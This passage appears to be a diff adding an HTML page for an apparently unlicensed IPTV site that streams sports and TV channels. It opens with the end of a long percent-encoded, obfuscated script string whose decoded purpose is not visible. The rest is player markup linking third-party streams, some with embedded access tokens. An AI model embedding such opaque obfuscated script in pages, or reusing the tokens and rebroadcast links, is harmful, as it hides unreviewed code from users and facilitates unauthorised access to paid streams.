%29%2c%24%1c%28%34%36%27%1e%2e%25%33%0e%02%19%18%5a%6a%6a%59%5e%68%23%6a%5d%57%65%6c%6f%32%19%29%2d%1e%31%03%02%1c%13%68%5c%70%68%24%65%6f%5f%5b%6c%68%32%13%29%29%68%74%36%01%03%1b%1e%03%02%71%0e%02%19%18%1c%19%01%03%29%6c%6a%5d%1c%7c%01%07%18%1c%64%5d%6b%60%67%6c%21%68%60%6c%37%18%2a%29%6c%75%34%03%00%1c%1c%63%6f%6e%61%68%60%6f%6f%35%1e%68%59%60%52%68%60%72%59%36%01%03%1b%1e%6d%76%59%65%66%65%6b%77%37%1c%65%62%5a%5a%59%6e%3c%01%07%05%02%04%02%00%05%73%03%02%2e%52%60%60%63%6e%65%59%67%6f%1e%71%01%02%13%1c%63%64%6f%58%68%33%1b%62%5b%66%68%3c%01%07%18%1c%64%5d%6b%60%67%6c%21%60%56%66%6d%36%1c%28%29%6d%73%31%03%02%1c%13%5b%6a%64%6f%6f%32%1d%6d%65%58%24%2a%26%29%25%18%2d%31%37%21%1b%2e%27%33%01%0d%1c%19%62%6f%6b%68%20%70%5b%67%67%64%67%32%19%5e%6f%65%58%32%06%00%1e%1c%66%60%6e%6d%25%6b%60%72%58%35%1e%2f%29%6c%7b%33%04%06%71%04%02%00%05%2c%5f%60%65%68%6e%6f%61%67%61%68%1d%74%03%00%1c%1c%69%60%6a%59%68%37%1c%6b%62%65%66%68%33%0e%02%19%18%61%58%6a%66%62%6c%23%6a%65%68%64%6d%36%1c%28%29%6d%73%31%03%02%1c%13%66%6a%6a%68%24%6b%64%75%5b%30%1c%2d%26%6c%71%37%01%07%1c%1d%61%6d%6c%68%21%78%59%60%63%64%6d%32%1d%69%6d%68%61%5d%6f%33%04%06%71%04%02%2f%62%63%65%58%65%79%73%04%06%1c%19%1c%1d%66%5f%68%67%65%61%21%6d%6b%6c%37%1c%2b%2e%6e%76%33%01%0d%1c%19%18%1c%58%60%64%60%6c%23%65%68%56%61%6e%36%1c%5e%59%6f%6f%5b%68%33%01%0d%1c%19%18%1c%6d%59%75%6f%23%5f%60%65%68%6e%37%18%5b%5c%6e%69%5e%68%31%01%02%7e%01%07%05%02%04%02%2f%62%63%65%2d%73%0e%02%19%18%1c%19%77%64%5f%6a%66%32%1c%38%2c%1c%37%01%07%71%00%05%03%00%2e%68%56%74%6d%77%01%07%1c%1d%1b%1e%59%6f%60%60%6a%37%18%77%61%65%69%5e%31%03%02%1c%13%1c%19%62%6f%6b%68%20%6c%67%70%59%32%13%5d%6c%6c%6f%36%01%03%76%03%00%01%02%21%68%5c%70%68%58%6a%58%5a%71%03%02%1c%13%1c%19%65%5d%6f%67%64%69%23%6a%6f%6c%3d%1c%2f%28%6c%71%33%00%05%1e%1e%1c%1c%67%59%71%6c%21%58%60%64%60%6c%30%1c%5b%56%6e%6d%5d%6a%36%01%03%76%03%00%01%02%21%66%58%25%68%61%73%00%05%1e%1e%66%6f%61%68%24%6f%65%77%59%33%1b%28%2e%6c%74%13%1d%60%65%6c%6a%6a%69%5a%6c%6a%33%01%0d%1c%19%5f%6f%65%6f%6b%35%1e%68%67%5a%2b%2a%2c%2d%20%19%2d%35%30%22%1e%2c%25%13%1d%60%65%6c%6a%6a%69%5a%6c%6a%33%01%0d%1c%19%65%5d%6f%67%64%69%23%68%65%67%6b%68%37%18%2d%29%6c%75%1b%1f%67%61%6c%60%6a%6d%59%6e%6d%33%00%05%03%00%71%01%0d%2e%60%6c%59%64%1c%64%66%65%1e%73%01%0d%1c%19%5e%6f%6f%58%58%6d%23%68%5d%58%6a%69%6e%36%1c%28%2c%6d%73%31%03%02%71%0e%02%1e%5f%6f%6b%68%58%69%6a%23%5b%6f%61%68%58%61%6e%5c%6a%1d%74%03%00%1c%1c%6e%5d%6f%63%65%6b%21%5b%68%6a%6a%6f%61%3d%1c%2e%28%6c%71%33%00%05%73%03%02%66%60%6f%6d%5d%6a%19%73%00%05%1e%1e%58%65%64%6c%65%59%75%37%1c%66%6d%67%5a%33%01%0d%1c%19%63%6a%60%58%20%60%5f%6e%32%1c%23%2e%2c%5d%61%36%01%03%1b%1e%65%6a%65%57%21%6d%5d%61%69%60%5c%6f%5b%23%5b%6f%6f%69%64%6a%6b%37%1c%6b%5e%6e%5b%5d%68%2b%29%25%18%61%60%6e%60%5a%76%26%2d%2c%63%74%25%18%2d%63%6a%24%22%31%03%02%1c%13%6c%6a%6f%65%6d%65%6e%69%30%1e%66%65%7b%59%5d%37%01%07%1c%1d%5d%6d%6a%68%6f%6e%32%19%28%33%04%02%1d%1b%62%5b%66%68%3d%1c%29%37%01%07%1c%1d%70%67%5a%68%64%3d%1c%28%28%2c%1c%33%00%05%1e%1e%5a%5d%54%63%62%6e%6f%6c%6e%59%26%59%6d%60%6f%65%32%19%72%5d%6f%24%20%26%69%5b%5b%6f%61%58%58%6e%75%3e%6f%61%68%68%27%33%01%0d%1c%19%68%5d%5d%58%64%69%65%30%1c%2c%63%74%19%2c%6c%71%1c%2c%2b%6e%76%33%01%0d%1c%19%66%69%6e%68%64%61%77%23%5b%6f%61%68%5c%6a%68%37%1c%5a%5e%6c%6a%59%6a%3c%01%07%18%1c%58%60%64%60%6c%23%65%68%56%61%6e%36%1c%5e%59%6f%6f%5b%68%33%01%0d%1c%19%18%1c%19%1c%1d%1b%1e%1e%66%6f%61%68%24%6f%65%77%59%33%2a%36%6e%74%33%0e%02%74%05%02%63%6f%6e%6f%5b%68%1c%5d%13%73%04%06%1c%19%68%58%73%6a%23%5d%60%6a%67%6b%36%1c%5e%59%6f%6f%5b%68%33%01%0d%1c%19%5f%6f%65%6f%6b%35%1e%74%5d%6a%2b%21%24%68%6a%60%61%5c%6d%77%39%6f%60%60%6a%20%37%01%07%71%00%05%64%6d%6f%68%56%6a%19%59%32%6b%68%65%26%59%66%65%60%57%24%2e%21%1c%60%1c%72%06%00%1e%1c%5a%52%5b%66%63%6a%6a%69%6f%5f%30%1e%76%5d%65%24%24%25%6c%6f%65%60%5a%68%77%3b%6f%6f%6f%6f%21%33%04%02%1d%1b%58%6d%6a%58%56%6a%24%6e%5d%5d%65%68%6c%30%1e%29%2c%16%33%04%06%1c%19%6c%5c%5f%5a%67%6e%67%3d%1c%28%28%6c%71%1c%2c%2b%6e%76%33%01%0d%1c%19%5f%6f%65%6f%6b%35%1e%74%5d%6a%2b%21%24%6f%59%5e%6f%6f%5f%5f%68%75%4f%63%6c%6a%6f%65%6d%59%24%34%03%00%1c%1c%6e%5d%6f%63%65%6b%21%69%68%6e%30%1c%21%27%2c%69%70%33%04%02%1d%1b%58%6d%6a%58%56%6a%37%18%2a%69%74%1d%6c%6d%62%65%58%13%76%58%6e%24%24%21%6a%5e%59%6d%6e%58%52%6a%70%3f%6f%65%6f%6b%22%31%03%02%71%0e%02%04%06%32%6f%6f%6e%6f%1e%71%01%02%13%1c%24%25%64%63%6b%33%1b%28%74%61%5d%7b%33%04%06%1c%19%21%20%6b%68%67%61%5d%65%75%3e%6b%60%6a%6a%33%1b%6d%68%5d%6e%68%59%36%05%02%19%1c%20%26%69%5b%5b%6f%61%58%58%6e%75%3e%6f%61%68%68%30%1c%1b%3b%5d%29%28%2c%29%33%00%05%1e%1e%21%21%64%59%5e%6b%6e%5d%5d%6b%72%4d%6e%6c%6f%64%65%6d%5d%32%19%77%65%62%6a%5b%33%01%0d%71%04%06%32%37%21%76%5e%58%61%65%68%2e%6b%5e%6e%6f%65%60%5b%5a%68%1e%73%01%0d%1c%19%73%65%5d%68%65%35%1e%2e%59%61%3c%01%07%18%1c%61%59%64%60%66%6a%32%1c%23%59%64%37%01%07%71%00%05%30%30%21%77%56%5a%66%61%68%24%6b%5a%6d%6d%62%60%5a%52%6a%24%6c%64%6c%61%5b%1b%71%03%02%1c%13%5a%58%5f%63%62%6a%6e%6e%6c%5a%32%1c%79%5d%6f%20%21%24%6b%58%5c%6d%6c%58%5d%65%75%3e%6b%60%6a%6a%24%34%03%00%71%01%0d%32%37%25%77%5c%5a%62%62%6a%23%6b%5b%65%6f%65%64%5a%58%6a%20%6f%68%5f%5b%63%13%73%04%06%1c%19%5a%5c%5c%61%65%6a%6f%66%6e%5d%36%1c%6b%6f%6f%5e%31%03%02%71%0e%02%27%18%73%04%02%1d%1b%23%75%59%5a%6c%65%6d%25%69%6e%59%6b%26%69%5b%60%59%54%68%37%18%6e%6a%6e%58%34%03%00%1c%1c%2e%61%6a%76%21%6c%6b%58%6d%23%69%59%60%56%5b%6d%36%1c%6b%6f%6f%5e%31%03%02%1c%13%21%64%6f%21%6c%6b%58%6d%23%69%59%60%56%5b%6d%36%1c%6b%6f%6f%5e%31%03%02%1c%13%69%6e%5d%6a%24%6b%58%67%5b%59%68%32%13%6e%6a%6a%59%36%01%03%76%03%00%01%02%57%65%73%2a%6b%5e%6a%6e%67%62%63%59%6e%66%1c%76%05%02%19%1c%6e%71%5b%68%66%60%60%77%37%18%5d%6c%68%6e%34%03%00%1c%1c%78%64%60%6c%59%24%6b%6d%5a%59%5b%32%1c%61%6f%72%6e%5d%69%33%00%05%73%03%02%01%0d%58%60%72%2e%6e%5b%6b%68%62%62%61%59%61%69%19%59%1c%76%01%03%1b%1e%5a%65%6b%63%60%58%71%32%19%65%6f%67%67%6c%59%21%55%60%6a%5f%63%36%01%03%1b%1e%59%6f%60%60%6a%37%18%77%61%65%69%5e%31%03%02%1c%13%68%5c%70%68%24%5d%61%62%65%6c%32%1c%54%59%6b%6c%59%6f%33%00%05%1e%1e%6c%5d%57%58%60%6a%67%37%1c%2b%6b%76%31%01%02%13%1c%6d%5d%74%6d%21%59%5e%59%6d%6a%5d%67%65%6a%6a%32%19%6e%6e%69%5b%31%01%02%13%1c%64%59%6a%62%65%6f%26%6a%6d%6c%32%13%34%69%70%33%04%02%1d%1b%63%5f%6a%67%6a%6e%24%5e%6f%6d%68%6e%66%30%1e%36%6c%7b%33%04%06%71%04%02%00%05%03%00%01%02%21%5a%6c%6c%68%6a%6e%2b%1b%71%03%02%61%52%6a%62%61%6e%24%60%58%61%6a%30%1c%5d%66%68%6a%37%01%07%61%5c%6d%65%67%6e%21%65%65%62%60%68%37%1c%5c%6e%6a%6d%33%01%0d%77%60%5c%68%61%32%1d%33%2e%1b%33%01%0d%66%6a%6a%68%24%6b%64%75%5b%30%1c%2a%23%6c%71%37%01%07%5a%5c%5c%61%65%6a%6f%66%6e%5d%25%5b%6a%60%6e%6d%30%1e%1b%36%39%2c%29%28%2c%36%1c%00%05%59%6d%60%6f%65%32%19%73%64%60%68%58%34%1e%03%02%5a%60%6a%5d%5d%6a%37%1c%2d%6b%76%1e%6b%6f%6f%65%5d%18%1b%2f%2a%2b%34%03%00%5a%6f%65%58%5c%6e%21%6f%5d%59%62%6b%69%32%1c%26%4c%71%37%01%07%71%00%05%03%00%01%02%21%5a%6c%6c%68%6a%6e%2b%35%66%6d%76%59%65%1c%76%05%02%19%1c%5b%5a%59%61%67%6a%60%69%6b%5c%21%5e%6f%61%68%68%30%1c%1b%3b%5d%29%28%2c%29%33%00%05%1e%1e%5b%6f%6f%6f%6f%36%1c%72%64%64%6f%5b%31%01%02%7e%01%07%05%02%2b%3d%6b%5a%67%6c%1c%73%0e%02%19%18%1c%19%68%58%73%6a%23%5d%60%6a%67%6b%36%1c%5e%59%6f%6f%5b%68%33%01%0d%1c%19%18%1c%58%60%64%60%6c%23%65%68%56%61%6e%36%1c%5e%59%6f%6f%5b%68%33%01%0d%1c%19%18%1c%5d%65%6a%6b%62%5f%75%32%13%65%6b%64%65%6b%59%20%5d%62%6d%5b%63%3c%01%07%18%1c%19%1c%69%6d%5f%6c%6b%65%67%65%6a%6a%32%19%68%6b%5a%6c%69%66%6f%65%61%19%2a%2a%6e%33%00%05%1e%1e%1c%1c%54%6f%65%6b%6a%37%1c%6b%60%58%26%2c%20%13%2c%25%18%2c%20%33%00%05%73%03%02%01%0d%30%2a%6f%68%70%60%58%397129486%36%33%36%37%31%34%34' + unescape('%27%29%29%3b'));
+// -->
+</script>
+
+
+
+<body class="body">
+<style>
+body{
+    background: linear-gradient(to bottom, #c33764 0%,  #1d2671 100%)
+}
+</style>
+
+
+    <div id="carouselExampleIndicators" class="carousel slide" data-bs-ride="carousel">
+
+
+
+        <div class="carousel-inner">
+            <div class="carousel-item active">
+                <a data-toggle="modal" data-target="#myModal7"><img class="slideimg"
+                        src="https://images.mjunoon.tv:8181/slider/1597671098.webp" class="d-block w-100" alt="Hum-Tv">
+                    <div style="position:absolute; top: 20px; left:25px;">
+                        <h6 class="live">LIVE</h6>
+                </a>
+
+            </div>
+        </div>
+        <div class="carousel-item">
+            <a data-toggle="modal" data-target="#myModal15"> <img class="slideimg"
+                    src="https://srv2.jazztv.pk/jazzlive/uploads/slider/pak-vs-sa-slider.png" class="d-block w-100"
+                    alt="pakvssouthafrica">
+                <div style="position:absolute; top: 20px; left:25px;">
+                    <h6 class="live">LIVE</h6>
+            </a>
+        </div>
+    </div>
+
+    <div class="carousel-item">
+        <a data-toggle="modal" data-target="#myModal16"> <img class="slideimg"
+                src="https://images.mjunoon.tv:8181/slider/1600239005.webp" class="d-block w-100" alt="Urdu-1">
+            <div style="position:absolute; top: 20px; left:25px;">
+                <h6 class="live">LIVE</h6>
+        </a>
+    </div>
+    </div>
+
+    <div class="carousel-item">
+        <a data-toggle="modal" data-target="#myModal14"><img class="slideimg"
+                src="https://srv2.jazztv.pk/jazzlive/uploads/slider/ptvhome-slider.png?id=2" class="d-block w-100"
+                alt="ptv-home">
+            <div style="position:absolute; top: 20px; left:25px;">
+                <h6 class="live">LIVE</h6>
+        </a>
+    </div>
+    </div>
+    <div class="carousel-item">
+        <a data-toggle="modal" data-target="#myModal10"><img class="slideimg"
+                src="https://images.mjunoon.tv:8181/slider/1605699841.webp" class="d-block w-100" alt="SAMAA">
+            <div style="position:absolute; top: 20px; left:25px;">
+                <h6 class="live">LIVE</h6>
+        </a>
+    </div>
+    </div>
+
+    <div class="carousel-item">
+        <a data-toggle="modal" data-target="#myModal15"><img class="slideimg"
+                src="https://propakistani.pk/wp-content/uploads/2020/01/PSL-2020-banner.jpeg" class="d-block w-100"
+                alt="PSL">
+        </a>
+    </div>
+
+    <div class="carousel-item">
+        <a data-toggle="modal" data-target="#myModal4"><img class="slideimg"
+                src="https://images.mjunoon.tv:8181/slider/1606726180.webp" class="d-block w-100" alt="CORONA">
+            <div style="position:absolute; top: 20px; left:25px;">
+                <h6 class="live">LIVE</h6>
+        </a>
+    </div>
+    </div>
+    <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-bs-slide="prev">
+        <span class="fas fa-chevron-circle-left" aria-hidden="true"></span>
+        <span class="visually-hidden">Previous</span>
+    </a>
+    <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-bs-slide="next">
+        <span class="fas fa-chevron-circle-right" aria-hidden="true"></span>
+        <span class="visually-hidden">Next</span>
+    </a>
+    </div>
+<style>
+.marquee{border: 2px solid #ff0000; border-radius: 3px; width: 90%; margin: auto; display: block;}.marquee span{display: inline-block; background: #ff0000; padding: 0px 10px; color: #fff; display: inline-block; float: right; width: auto; line-height: 35px;}.marquee marquee{display: block; line-height: 35px; z-index: -1; margin-right: 10px; width: auto; margin: auto;}
+
+</style>
+
+<div class="marquee yellow"><span> : تنويه</span> <marquee scrollamount="5" direction="right" onmouseover="stop()" onmouseout="start()"> <font color="white"> 
+في حال توقف أي قناة رابط قناتنا على التلغرام https://t.me/neoniptv
+
+ </font></marquee> </div>
+  
+<script type="text/javascrit">
+
+</script>
+
+    
+
+
+
+   <div class="scrollmen">
+
+<a class="imgclass" data-toggle="modal" data-target="#myModal5"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/Bein-Sports/Bein.Sports.1.png"
+                alt="bein sports 1 ">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal1"><img class="imgzom"
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/France24.png/509px-France24.png"
+                alt="bein sports 2">
+
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal2"><img class="imgzom"
+                src="https://upload.wikimedia.org/wikipedia/commons/2/2e/2M_TV_logo.png"
+                alt="bein sports 3">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal3"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/Kids/MBC.3.png"
+                alt="bein sports 4">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal4"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/Kids/Boomerang.png"
+                alt="bein sports 5">
+        </a>
+
+        
+        <a class="imgclass" data-toggle="modal" data-target="#myModal15"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/Kids/NAT.GEO.KIDS.png">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal6"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/Kids/Teletubbies.png">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal7"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/Kids/Tom.&.Jerry.png">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal8"><img class="imgzom"
+                src="http://51.195.91.73/Channels-Logo/MY-HD/MY-HD-Logo.png">
+        </a>
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal9"><img class="imgzom"
+                src="https://b.top4top.io/p_1854642bi0.jpg">
+        </a>
+
+        <a class="imgclass" style="text-decoration:none" data-toggle="modal" data-target="#myModal10"><img
+                class="imgzom" src="https://b.top4top.io/p_1854642bi0.jpg">
+        </a>
+
+
+        <a class="imgclass" data-toggle="modal" data-target="#myModal11"><img class="imgzom"
+                src="https://b.top4top.io/p_1854642bi0.jpg">
+        </a>
+
+     
+        
+
+    </div>
+
+
+    
+
+
+
+
+
+
+      
+ <!-- ModalNO#1 -->
+        <div style="width: 100%;" class="modal fade" id="myModal1" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 2 HD </h4>
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits1" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 80px; margin-top: -23px;color:black;">Viewers</h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video1" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="https://ssc-5-ak.akamaized.net/out/v1/6ae0a2ebab224c72ab9c298afeec8d91/index.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/43c2c7b22439581."
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video1').pause()">Back</button>
+تنوية: قم بضغط على مربع تكبير صورة اذا لم تجد قناة شغاله قم بخروج من تطبيق وإعادة دخول ستجده شغاله 
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+        <!-- ModalNO#2 -->
+        <div style="width: 100%;" class="modal fade" id="myModal2" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 3 HD </h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits2" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers</h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video2" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://209.126.8.89:25461/Qtvconnectdlna/W7h5W8tZdf/1.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/34d0ecb91942ec6.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video2').pause()">Back</button>
+تنوية: قم بضغط على مربع تكبير صورة اذا لم تجد قناة شغاله قم بخروج من تطبيق وإعادة دخول ستجده شغاله 
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+        <!-- ModalNO#3 -->
+        <div style="width: 100%;" class="modal fade" id="myModal3" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 4 HD</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits3" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video3" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://68.183.15.153:9978/sports2021/bein4/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Mi84LzIwMjEgNDo0NTowOCBQTSZoYXNoX3ZhbHVlPVVZL2VIVkczby83bVR3V0xZSWhaSlE9PSZ2YWxpZG1pbnV0ZXM9Mg=="
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/Hum-news-80/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video3').pause()">Back</button>
+تنوية: قم بضغط على مربع تكبير صورة اذا لم تجد قناة شغاله قم بخروج من تطبيق وإعادة دخول ستجده شغاله 
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+        <!-- ModalNO#4 -->
+        <div style="width: 100%;" class="modal fade" id="myModal4" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 5 HD </h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits4" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video4" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/6c73043dfbed2dd.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/CORONA/playlist.m3u8?"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video4').pause()">Back</button>
+
+تنوية: قم بضغط على مربع تكبير صورة اذا لم تجد قناة شغاله قم بخروج من تطبيق وإعادة دخول ستجده شغاله 
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+        <!-- ModalNO#5 -->
+        <div style="width: 100%;" class="modal fade" id="myModal5" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 1 HD </h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits5" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+
+                    <div class="modal-body">
+
+
+
+                        <li data-url="http://7b30f9aa.tvclub.xyz:80/iptv/SGME6W4L2A6MNZ/6131/index.m3u8"><img src="https://i5.satexpat.com/cha/sa/ssc-95x31.gif"  border="3px"></li>
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video5').pause()">Back</button>
+
+تنوية: قم بضغط على مربع تكبير صورة اذا لم تجد قناة شغاله قم بخروج من تطبيق وإعادة دخول ستجده شغاله 
+
+ادا ضهر خطأ في قناة قم بسحب من أعلى إلى أسفل لتحديت صفحة 
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+        <!-- ModalNO#6 -->
+        <div style="width: 100%;" class="modal fade" id="myModal6" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 1 SD</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits6" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video6" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/231bf167aecdf2b.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/geonews-137/playlist.m3u8?"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video6').pause()">Back</button>
+
+تنوية: قم بضغط على مربع تكبير صورة اذا لم تجد قناة شغاله قم بخروج من تطبيق وإعادة دخول ستجده شغاله 
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+        <!-- ModalNO#7 -->
+        <div style="width: 100%;" class="modal fade" id="myModal7" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 2 SD</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits7" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video7" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/43c2c7b22439581.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/Hum-TV-136-3/playlist.m3u8?"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video7').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
